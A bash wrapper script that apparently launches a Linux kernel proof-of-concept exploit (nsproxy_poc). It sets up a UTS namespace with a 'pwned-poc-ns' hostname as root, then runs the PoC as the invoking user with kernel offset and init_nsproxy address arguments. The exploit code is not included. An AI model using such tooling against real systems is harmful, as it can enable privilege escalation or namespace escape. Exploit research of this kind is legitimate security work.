#!/bin/bash
# Wrapper for nsproxy_poc that handles the namespace setup with root
# privileges, then drops back to the invoking user before running the PoC.
# This way nsproxy_poc itself never needs to run as root.
#
# Usage: ./run_nsproxy_poc.sh <mode> <nsproxy_offset> <init_nsproxy_addr>
# Example:
#   ./run_nsproxy_poc.sh 0 0xA00 0xffffffff81010e00

set -e

POC_DIR="$(cd "$(dirname "$(readlink -f "$0")")" && pwd)"
POC="$POC_DIR/nsproxy_poc"
TARGET_USER="${SUDO_USER:-$(id -un)}"
FAKE_HOST="pwned-poc-ns"

if [ ! -x "$POC" ]; then
  echo "[-] $POC not built or not executable" >&2
  echo "    Build with: gcc -O2 -o $POC $POC.c" >&2
  exit 1
fi

# Re-exec under sudo so the unshare + hostname step has CAP_SYS_ADMIN.
if [ "$EUID" -ne 0 ]; then
  exec sudo --preserve-env=TARGET_USER -- "$0" "$@"
fi

echo "[wrapper] running as root, target user for PoC: $TARGET_USER"

# Create a new uts namespace, set a custom hostname, then drop privileges
# back to the invoking user and exec the PoC. --fork is required so the
# hostname change applies to the child's uts ns rather than the wrapper's.
exec unshare --uts --fork --kill-child -- bash -s "$@" <<EOF
set -e
hostname '$FAKE_HOST'
echo "[wrapper] new uts ns created, hostname=\$(hostname)"
exec sudo -u '$TARGET_USER' -- '$POC' "\$@"
EOF
